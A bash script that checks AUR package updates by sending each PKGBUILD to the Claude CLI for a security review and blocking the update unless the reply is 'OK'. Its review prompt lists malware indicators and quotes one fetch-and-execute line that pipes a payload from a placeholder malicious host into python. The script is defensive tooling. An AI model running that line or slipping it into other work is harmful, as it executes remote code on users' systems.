#!/bin/bash
# ~/bin/secure-update.sh
# Secure AUR update wrapper with Claude security review

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Temporary directory for PKGBUILDs
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

echo -e "${BLUE}=== Secure AUR Update Check ===${NC}\n"

# First, update package databases
echo -e "${YELLOW}Updating package databases...${NC}"
sudo pacman -Sy

# Get list of AUR packages that need updates
echo -e "${YELLOW}Checking for AUR updates...${NC}"
AUR_UPDATES=$(yay -Qua 2>/dev/null | awk '{print $1}')

if [ -z "$AUR_UPDATES" ]; then
    echo -e "${GREEN}No AUR updates available!${NC}"
    echo -e "\n${YELLOW}Checking official repository updates...${NC}"
    sudo pacman -Syu
    exit 0
fi

# Count updates
UPDATE_COUNT=$(echo "$AUR_UPDATES" | wc -l)
echo -e "${BLUE}Found $UPDATE_COUNT AUR package(s) to review:${NC}"
echo "$AUR_UPDATES"
echo

# Security check each package
FAILED_PACKAGES=""
SAFE_PACKAGES=""

for package in $AUR_UPDATES; do
    echo -e "\n${YELLOW}Reviewing: $package${NC}"
    echo "----------------------------------------"
    
    # Download PKGBUILD to temp directory
    cd "$TMPDIR"
    if ! yay -G "$package" &>/dev/null; then
        echo -e "${RED}Failed to download PKGBUILD for $package${NC}"
        FAILED_PACKAGES="$FAILED_PACKAGES $package"
        continue
    fi
    
    cd "$package"
    
    # Create comprehensive security prompt
    SECURITY_PROMPT="You are reviewing an AUR package update for security threats. This is CRITICAL - malware was recently found in AUR packages.

Package: $package

Review ALL files in this directory, especially:
1. PKGBUILD
2. Any .sh files
3. Any .install files
4. All source files

Look for these SPECIFIC threats:
- curl or wget downloading and executing remote code
- python -c with encoded/obfuscated commands
- base64 or hex encoded payloads
- systemd service creation
- modifications to PATH or shell configs
- suspicious URLs (especially pastebin-like services)

Recent malware example:
python -c \"\$(curl https://malicious-site.com/payload)\"

Respond with ONLY:
- 'OK' if the package appears safe
- 'NOT OK: [specific reason]' if you find ANY security concerns

Be paranoid - any suspicious code means NOT OK."

    # Review with Claude
    echo -e "${BLUE}Running Claude security analysis...${NC}"
    
    CLAUDE_RESPONSE=$(claude --print "$SECURITY_PROMPT" . 2>&1)
    
    # Check Claude's response
    if echo "$CLAUDE_RESPONSE" | grep -q "^OK$"; then
        echo -e "${GREEN}✓ SAFE: Package passed security review${NC}"
        SAFE_PACKAGES="$SAFE_PACKAGES $package"
    else
        echo -e "${RED}✗ DANGER: Security issue detected!${NC}"
        echo -e "${RED}Claude says: $CLAUDE_RESPONSE${NC}"
        FAILED_PACKAGES="$FAILED_PACKAGES $package"
        
        # Show problematic code if found
        echo -e "\n${YELLOW}Showing PKGBUILD for manual inspection:${NC}"
        head -n 50 PKGBUILD
        
        echo -e "\n${RED}STOPPING UPDATE PROCESS - SECURITY THREAT DETECTED${NC}"
        break
    fi
done

echo -e "\n${BLUE}=== Security Review Summary ===${NC}"

if [ -n "$SAFE_PACKAGES" ]; then
    echo -e "${GREEN}Safe packages:${NC}"
    for pkg in $SAFE_PACKAGES; do
        echo -e "  ${GREEN}✓${NC} $pkg"
    done
fi

if [ -n "$FAILED_PACKAGES" ]; then
    echo -e "\n${RED}BLOCKED packages:${NC}"
    for pkg in $FAILED_PACKAGES; do
        echo -e "  ${RED}✗${NC} $pkg"
    done
    echo -e "\n${RED}Update cancelled due to security concerns!${NC}"
    echo -e "${YELLOW}Please investigate the flagged packages before updating.${NC}"
    exit 1
else
    echo -e "\n${GREEN}All AUR packages passed security review!${NC}"
    
    # Ask to proceed
    echo -e "\n${YELLOW}Proceed with updates? [y/N]${NC}"
    read -r response
    
    if [[ "$response" =~ ^[Yy]$ ]]; then
        echo -e "\n${BLUE}Updating packages...${NC}"
        yay -Sua --noconfirm
        
        # Also update official packages
        echo -e "\n${BLUE}Updating official repository packages...${NC}"
        sudo pacman -Syu
    else
        echo -e "${YELLOW}Update cancelled by user.${NC}"
    fi
fi
